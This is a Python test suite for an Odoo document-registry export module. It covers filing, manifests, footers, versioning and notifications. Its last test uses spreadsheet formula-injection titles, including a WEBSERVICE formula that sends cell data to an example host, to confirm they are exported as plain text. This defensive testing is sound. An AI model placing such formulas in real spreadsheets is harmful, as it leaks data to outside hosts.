import hashlib
import io
import json
import zipfile
from unittest.mock import patch

import pytz

from odoo import fields
from odoo.tests import TransactionCase, freeze_time, tagged


@tagged("post_install", "-at_install")
class TestRegistryExport(TransactionCase):
    @classmethod
    def setUpClass(cls):
        super().setUpClass()
        Type = cls.env["project.document.type"]
        # Types without section templates: release does not wait on empty
        # mandatory sections that a test has no reason to fill.
        cls.type_proc = Type.create({"name": "Procédure d'essai", "code": "T_PROC", "is_internal": True})
        cls.type_policy = Type.create({"name": "Politique d'essai", "code": "T_POL", "is_internal": True})
        cls.type_register = Type.create({"name": "Registre d'essai", "code": "T_REG", "is_internal": True})
        cls.type_orphan = Type.create({"name": "Type sans dossier", "code": "T_ORPHAN", "is_internal": True})

        cls.template = cls.env.ref("bf_document_export.template_pyramid").copy(
            {"code": "T_PYRAMID", "name": "Pyramide d'essai", "lang": "en_US"}
        )
        folders = {f.name: f for f in cls.template.folder_ids}
        folders["01 - Politiques"].type_codes = "T_POL"
        folders["02 - Procédures"].type_codes = "T_PROC"
        folders["05 - Registres"].type_codes = "T_REG"
        cls.template.confidential_type_ids = cls.type_register

        cls.proc = cls._internal_doc("PRO-901", "PRO-901 — Réponse aux incidents", cls.type_proc)
        cls.policy = cls._internal_doc("POL-901", "Politique d'accès", cls.type_policy)
        cls.register = cls._internal_doc("REG-901", "Registre des incidents", cls.type_register)
        cls.orphan = cls._internal_doc("OTH-901", "Document à classer", cls.type_orphan)
        cls.draft = cls.env["project.document"].create({
            "name": "Procédure en préparation", "code": "PRO-902", "type_id": cls.type_proc.id,
            "body_source": "internal",
        })
        cls._section(cls.draft, "<p>Pas encore publié.</p>")
        cls.docs = cls.proc | cls.policy | cls.register | cls.orphan | cls.draft

    @classmethod
    def _section(cls, document, content):
        cls.env["project.document.section"].create({
            "document_id": document.id, "code": "OBJECTIF", "name": "Objectif", "content": content,
        })

    @classmethod
    def _internal_doc(cls, code, name, doc_type, versions=("1.0",)):
        document = cls.env["project.document"].create({
            "name": name, "code": code, "type_id": doc_type.id, "body_source": "internal",
        })
        cls._section(document, f"<p>Corps de {code}.</p>")
        for index, number in enumerate(versions):
            if index:
                # The registry refuses to release a body identical to the previous one.
                document.section_ids[:1].content = f"<p>Corps de {code}, version {number}.</p>"
            version = cls.env["project.document.version"].create({
                "document_id": document.id, "version_number": number,
                "change_type": "minor", "effective_date": "2026-10-01",
            })
            version.action_release()
        document.state = "active"
        return document

    def _run(self, template=None, documents=None):
        run = self.env["bf.document.export.run"].create({
            "template_id": (template or self.template).id,
            "document_ids": [(6, 0, (documents or self.docs).ids)],
        })
        run._execute()
        self.assertEqual(run.state, "done", run.log)
        archive = zipfile.ZipFile(io.BytesIO(run.attachment_id.raw))
        root = (template or self.template).root_name
        manifest = json.loads(archive.read(f"{root}/manifest.json"))
        return run, archive, manifest

    # ------------------------------------------------------------------ filing

    def test_files_by_type_with_stable_names(self):
        _run, archive, manifest = self._run()
        paths = {d["code"]: d["path"] for d in manifest["documents"]}
        self.assertTrue(paths["PRO-901"].startswith("Politiques et procédures/02 - Procédures/PRO-901 - Réponse aux incidents."))
        self.assertTrue(paths["POL-901"].startswith("Politiques et procédures/01 - Politiques/POL-901 - Politique d'accès."))
        self.assertNotIn("v1.0", paths["PRO-901"], "the current file name carries no version")
        self.assertTrue(paths["OTH-901"].startswith("Politiques et procédures/98 - À classer/"))
        self.assertTrue(any("T_ORPHAN" in w or "Type sans dossier" in w for w in manifest["warnings"]))

    def test_drafts_and_confidential_registers_stay_out_by_default(self):
        _run, _archive, manifest = self._run()
        codes = {d["code"] for d in manifest["documents"]}
        self.assertNotIn("PRO-902", codes)
        self.assertNotIn("REG-901", codes)

    def test_drafts_marked_and_registers_restricted_on_request(self):
        self.template.write({"drafts_mode": "mark", "confidential_mode": "restricted"})
        _run, _archive, manifest = self._run()
        entries = {d["code"]: d for d in manifest["documents"]}
        self.assertTrue(entries["PRO-902"]["path"].startswith("Politiques et procédures/_Brouillons/02 - Procédures/"))
        self.assertIn("DRAFT", entries["PRO-902"]["path"])
        self.assertTrue(entries["REG-901"]["confidential"])
        self.assertIn("Politiques et procédures/05 - Registres", manifest["restricted_folders"])

    def test_preview_tells_where_each_document_lands(self):
        preview = self.template.preview_filing()
        rows = {r["code"]: r for r in preview["rows"]}
        self.assertEqual(rows["PRO-901"]["folder"], "02 - Procédures")
        self.assertEqual(rows["PRO-901"]["file_name"], "PRO-901 - Réponse aux incidents.pdf")
        self.assertTrue(rows["PRO-901"]["filed"])
        self.assertEqual(rows["OTH-901"]["folder"], "98 - À classer")
        self.assertFalse(rows["OTH-901"]["filed"])
        self.assertNotIn("REG-901", rows, "a confidential register stays out by default")
        self.assertNotIn("PRO-902", rows, "a draft stays out by default")
        self.assertGreaterEqual(preview["left_out"].get("confidential", 0), 1)
        self.assertGreaterEqual(preview["left_out"].get("draft", 0), 1)
        # Nothing is rendered, and the preview agrees with a real export.
        _run, _archive, manifest = self._run()
        exported = {d["code"]: d["path"] for d in manifest["documents"]}
        for code, row in rows.items():
            if code in exported:
                self.assertTrue(exported[code].startswith(f"Politiques et procédures/{row['folder']}/"), code)

    def test_indexes_and_hashes(self):
        _run, archive, manifest = self._run()
        names = archive.namelist()
        for expected in ("00 - Liste maîtresse.xlsx", "index.html", "manifest.json", "LISEZMOI.txt"):
            self.assertIn(f"Politiques et procédures/{expected}", names)
        for entry in manifest["documents"]:
            self.assertEqual(hashlib.sha256(archive.read(entry["path"])).hexdigest(), entry["sha256"])
        index = archive.read("Politiques et procédures/index.html").decode()
        self.assertIn("PRO-901", index)

    def test_exported_copy_says_so_on_every_page(self):
        _run, archive, manifest = self._run()
        entry = next(d for d in manifest["documents"] if d["code"] == "PRO-901")
        body = archive.read(entry["path"]).decode()
        self.assertIn('class="footer"', body)
        self.assertIn("PRO-901 · v1.0 · effective 2026-10-01 · Copy exported on", body)
        # Printing from the registry itself is unchanged.
        plain, _type = self.env["ir.actions.report"]._render_qweb_pdf(
            "project_knowledge_matrix.action_report_document_version_body",
            res_ids=self.proc.version_ids.ids,
        )
        self.assertNotIn("Copy exported on".encode(), plain)

    def test_copy_is_dated_in_the_requesters_time_zone(self):
        self.env.user.tz = "America/Toronto"
        with freeze_time("2026-10-08 02:30:00"):
            run, archive, manifest = self._run(documents=self.proc)
        self.assertTrue(manifest["generated_at"].startswith("2026-10-07 22:30"), manifest["generated_at"])
        # create_date comes from the transaction clock, not from freeze_time.
        local = pytz.utc.localize(run.create_date).astimezone(pytz.timezone("America/Toronto"))
        self.assertTrue(run.name.endswith(local.strftime("%Y-%m-%d %H:%M")), run.name)
        self.assertNotIn(fields.Datetime.to_string(run.create_date)[:16], run.name)
        body = archive.read(manifest["documents"][0]["path"]).decode()
        self.assertIn("Copy exported on 2026-10-07", body)

    def test_superseded_versions_go_to_archives(self):
        document = self._internal_doc("PRO-903", "Procédure révisée", self.type_proc, versions=("1.0", "1.1"))
        self.template.archives_mode = "superseded"
        _run, archive, manifest = self._run(documents=document)
        archived = [n for n in archive.namelist() if n.startswith("Politiques et procédures/99 - Archives/")]
        self.assertEqual(len(archived), 1, archived)
        self.assertIn("v1.0", archived[0])
        entry = manifest["documents"][0]
        self.assertEqual(entry["version"], "1.1")

    def test_path_budget_and_collisions(self):
        self.template.max_path_length = 90
        long_doc = self._internal_doc("PRO-904", "Une procédure au titre beaucoup trop long " * 4, self.type_proc)
        twin = self._internal_doc("PRO-905", "Jumelle", self.type_proc)
        twin_bis = self._internal_doc("PRO-905-B", "Jumelle", self.type_proc)
        # Without the code in the name, the two land on the same file name.
        self.template.name_pattern = "{title}"
        _run, _archive, manifest = self._run(documents=long_doc | twin | twin_bis)
        paths = [d["path"] for d in manifest["documents"]]
        self.assertTrue(all(len(p) <= 90 for p in paths if "PRO-904" in p), paths)
        self.assertEqual(len(set(paths)), len(paths))
        self.assertTrue(any("(2)" in p for p in paths))

    def test_files_by_classification_through_ancestors(self):
        template = self.env.ref("bf_document_export.template_process").copy(
            {"code": "T_PROCESS", "name": "Processus d'essai", "lang": "en_US", "split_by_type": False}
        )
        self.proc.classification_ids = self.env.ref("bf_document_export.class_process_3_1")
        _run, _archive, manifest = self._run(template=template, documents=self.proc | self.policy)
        paths = {d["code"]: d["path"] for d in manifest["documents"]}
        self.assertIn("/03 - Soutien/", paths["PRO-901"])
        self.assertIn("/98 - À classer/", paths["POL-901"])

    def test_mirror_keeps_everything(self):
        template = self.env.ref("bf_document_export.template_mirror").copy(
            {"code": "T_MIRROR", "name": "Miroir d'essai", "lang": "en_US"}
        )
        document = self._internal_doc("PRO-906", "Procédure miroir", self.type_proc, versions=("1.0", "2.0"))
        _run, archive, _manifest = self._run(template=template, documents=document)
        root = template.root_name
        names = [n for n in archive.namelist() if "PRO-906" in n]
        self.assertTrue(any(n.endswith("/fiche.json") for n in names), names)
        self.assertTrue(any("/sections/" in n for n in names), names)
        self.assertEqual(len([n for n in names if "/versions/" in n]), 2, names)
        record = json.loads(archive.read(next(n for n in names if n.endswith("/fiche.json"))))
        self.assertEqual([v["number"] for v in record["versions"]], ["1.0", "2.0"])
        self.assertTrue(all(n.startswith(root) for n in archive.namelist()))

    def test_tree_speaks_the_templates_language(self):
        # The cron runs in English: type names must still come in the tree's language.
        doc_type = self.env["project.document.type"].create(
            {"name": "Quick Guide test", "code": "T_LANG", "is_internal": True})
        doc_type.update_field_translations("name", {"fr_CA": "Guide rapide d'essai"})
        template = self.env.ref("bf_document_export.template_mirror").copy(
            {"code": "T_MIRROR_FR", "name": "Miroir en français", "lang": "fr_CA"})
        document = self._internal_doc("PRO-920", "Guide en français", doc_type)
        _run, _archive, manifest = self._run(template=template, documents=document)
        entry = manifest["documents"][0]
        self.assertIn("/Guide rapide d'essai/", entry["path"])
        self.assertEqual(entry["type"], "Guide rapide d'essai")

    def test_external_document_uses_the_version_attachment(self):
        document = self.env["project.document"].create({
            "name": "Politique en fichier", "code": "POL-907", "type_id": self.type_policy.id,
            "body_source": "external",
        })
        version = self.env["project.document.version"].create({
            "document_id": document.id, "version_number": "1.0", "change_type": "major",
        })
        attachment = self.env["ir.attachment"].create({
            "name": "politique.odt", "raw": b"contenu odt", "res_model": version._name, "res_id": version.id,
        })
        version.attachment_id = attachment
        version.action_release()
        document.state = "active"
        _run, archive, manifest = self._run(documents=document)
        entry = manifest["documents"][0]
        self.assertTrue(entry["path"].endswith("POL-907 - Politique en fichier.odt"))
        self.assertEqual(archive.read(entry["path"]), b"contenu odt")

    def _matrix_doc(self, code, items):
        project = self.env["project.project"].create({"name": f"Projet {code}"})
        section = self.env["project.knowledge.section"].create({"name": f"Section {code}", "code": f"S_{code}"})
        matrix = self.env["project.knowledge.matrix"].create({"name": f"{code} — Matrice", "project_id": project.id})
        for decision_id, name, state, content in items:
            self.env["project.knowledge.item"].create({
                "decision_id": decision_id, "name": name, "matrix_id": matrix.id, "section_id": section.id,
                "state": state, "content_html": content,
            })
        document = self.env["project.document"].create({
            "name": f"{code} — Politique en matrice", "code": code, "type_id": self.type_policy.id,
            "body_source": "external", "matrix_id": matrix.id,
        })
        version = self.env["project.document.version"].create({
            "document_id": document.id, "version_number": "1.2", "change_type": "minor",
            "effective_date": "2026-10-07",
        })
        version.action_release()
        document.state = "active"
        return document

    def test_matrix_document_prints_its_text(self):
        """No file, only a matrix: the export must print the policy's text, not the
        matrix's progress table (items, « Done »)."""
        document = self._matrix_doc("POL-908", [
            ("S02", "Portée", "done", "<p>Tous les modules publiés.</p>"),
            ("S01", "Objectif", "done", "<p>Garder les modules sains.</p>"),
            ("S03", "Définitions", "done", "<p><br></p>"),
            ("S04", "Ancienne règle", "na", "<p>Texte écarté.</p>"),
        ])
        document.matrix_id.item_ids.filtered(lambda i: i.decision_id == "S01").sequence = 1
        document.matrix_id.item_ids.filtered(lambda i: i.decision_id == "S02").sequence = 2
        run, archive, manifest = self._run(documents=document)
        entry = manifest["documents"][0]
        body = archive.read(entry["path"]).decode()
        self.assertIn("Garder les modules sains.", body)
        self.assertIn("Tous les modules publiés.", body)
        self.assertLess(body.index("Garder les modules sains."), body.index("Tous les modules publiés."))
        self.assertNotIn("Définitions", body)
        self.assertNotIn("Texte écarté.", body)
        # Nothing of the matrix's progress report.
        self.assertNotIn("PROGRESSION", body.upper())
        self.assertNotIn("km-footer", body)
        self.assertIn("POL-908 · v1.2 · effective 2026-10-07 · Copy exported on", body)
        self.assertIn("printed as it stands on the day of the export", body)
        self.assertFalse(run.warning_count, run.log)

    def test_matrix_without_text_is_left_out(self):
        document = self._matrix_doc("POL-909", [("S01", "Objectif", "pending", "<p><br></p>")])
        run, _archive, manifest = self._run(documents=document)
        self.assertFalse(manifest["documents"])
        self.assertIn("POL-909 : knowledge matrix « POL-909 — Matrice » has no text, document left out", run.log)

    # ------------------------------------------------------------------ trigger

    def test_publication_queues_an_export_when_asked(self):
        self.template.write({"deploy_mode": "on_release", "user_id": self.env.ref("base.user_admin").id})
        Run = self.env["bf.document.export.run"]
        before = Run.search_count([("template_id", "=", self.template.id)])
        document = self._internal_doc("PRO-908", "Procédure publiée", self.type_proc)
        queued = Run.search([("template_id", "=", self.template.id), ("state", "=", "queued")])
        self.assertEqual(len(queued), 1)
        self.assertEqual(queued.trigger, "release")
        # A second publication does not stack a second queued export.
        document.section_ids[:1].content = "<p>Corps de PRO-908, révisé.</p>"
        version = self.env["project.document.version"].create({
            "document_id": document.id, "version_number": "1.1", "change_type": "minor",
        })
        version.action_release()
        self.assertEqual(Run.search_count([("template_id", "=", self.template.id)]), before + 1)

    def test_on_demand_template_queues_nothing(self):
        Run = self.env["bf.document.export.run"]
        before = Run.search_count([("template_id", "=", self.template.id)])
        self._internal_doc("PRO-909", "Procédure sans suite", self.type_proc)
        self.assertEqual(Run.search_count([("template_id", "=", self.template.id)]), before)

    def test_wizard_takes_the_selection(self):
        wizard = self.env["bf.document.export.wizard"].with_context(
            active_model="project.document", active_ids=self.proc.ids
        ).create({"template_id": self.template.id})
        self.assertEqual(wizard.document_ids, self.proc)
        self.assertEqual(wizard.document_count, 1)
        action = wizard.action_export()
        run = self.env["bf.document.export.run"].browse(action["res_id"])
        self.assertEqual(run.state, "queued")
        self.assertEqual(run.document_ids, self.proc)

    def test_one_broken_document_does_not_sink_the_export(self):
        broken = self.env["project.document"].create({
            "name": "Sans fichier", "code": "PRO-910", "type_id": self.type_proc.id,
            "body_source": "external", "state": "active",
        })
        _run, _archive, manifest = self._run(documents=self.proc | broken)
        self.assertEqual({d["code"] for d in manifest["documents"]}, {"PRO-901"})
        self.assertTrue(any("PRO-910" in w for w in manifest["warnings"]))

    def _notice(self, run, execute):
        """The note an export posts when it ends, apart from the tracking of its state."""
        before = run.message_ids
        execute()
        notice = (run.message_ids - before).filtered(lambda m: not m.tracking_value_ids)
        self.assertEqual(len(notice), 1, "one notice per export")
        return notice

    def _release_run(self):
        return self.env["bf.document.export.run"].create({
            "template_id": self.template.id, "trigger": "release",
            "user_id": self.env.ref("base.user_admin").id,
            "document_ids": [(6, 0, self.proc.ids)],
        })

    def test_requested_export_notifies_the_requester(self):
        run = self.env["bf.document.export.run"].create({
            "template_id": self.template.id, "document_ids": [(6, 0, self.proc.ids)],
        })
        notice = self._notice(run, run._execute)
        self.assertEqual(run.state, "done", run.log)
        self.assertEqual(notice.partner_ids, run.user_id.partner_id)

    def test_publication_export_stays_quiet_when_all_went_well(self):
        run = self._release_run()
        notice = self._notice(run, run._execute)
        self.assertEqual(run.state, "done", run.log)
        self.assertFalse(notice.partner_ids, "the outcome stays on the export, nobody is written to")

    def test_publication_export_notifies_its_failure(self):
        run = self._release_run()
        with patch.object(type(self.template), "_build_archive", side_effect=RuntimeError("panne simulée")):
            notice = self._notice(run, run._execute)
        self.assertEqual(run.state, "failed")
        self.assertEqual(notice.partner_ids, self.env.ref("base.user_admin").partner_id)

    def test_publication_export_notifies_a_failed_delivery(self):
        run = self._release_run()
        with patch.object(type(run), "_deliver", side_effect=RuntimeError("cible en panne")):
            notice = self._notice(run, run._execute)
        self.assertEqual((run.state, run.delivery_state), ("done", "failed"))
        self.assertEqual(notice.partner_ids, self.env.ref("base.user_admin").partner_id)

    def test_failed_export_records_its_failure(self):
        run = self.env["bf.document.export.run"].create({"template_id": self.template.id})
        with patch.object(type(self.template), "_build_archive", side_effect=RuntimeError("panne simulée")):
            run._execute()
        self.assertEqual(run.state, "failed")
        self.assertIn("panne simulée", run.log)
        self.assertFalse(run.attachment_id)

    def test_sections_are_those_of_the_version_in_force(self):
        """The working copy is not published: the sections come frozen with the version."""
        template = self.template.copy({"code": "T_SECTIONS", "include_sections": True})
        self.proc.section_ids[:1].content = "<p>Brouillon de travail, pas publié.</p>"
        _run, archive, _manifest = self._run(template=template, documents=self.proc)
        sections = [n for n in archive.namelist() if "/PRO-901 - sections/" in n]
        self.assertTrue(sections, archive.namelist())
        body = archive.read(sections[0]).decode()
        self.assertIn("Corps de PRO-901.", body)
        self.assertNotIn("Brouillon de travail", body)

    def test_master_list_keeps_titles_as_text(self):
        """A title starting with « = » or « {= » is text in the master list, never a formula."""
        self.policy.name = '=HYPERLINK("http://example.com","x")'
        self.proc.name = '{=WEBSERVICE("https://example.com/?"&A1)}'
        _run, archive, _manifest = self._run(documents=self.policy | self.proc)
        book = zipfile.ZipFile(io.BytesIO(archive.read(f"{self.template.root_name}/00 - Liste maîtresse.xlsx")))
        self.assertNotIn("<f", book.read("xl/worksheets/sheet1.xml").decode())
        strings = book.read("xl/sharedStrings.xml").decode()
        self.assertIn("=HYPERLINK", strings)
        self.assertIn("{=WEBSERVICE", strings)
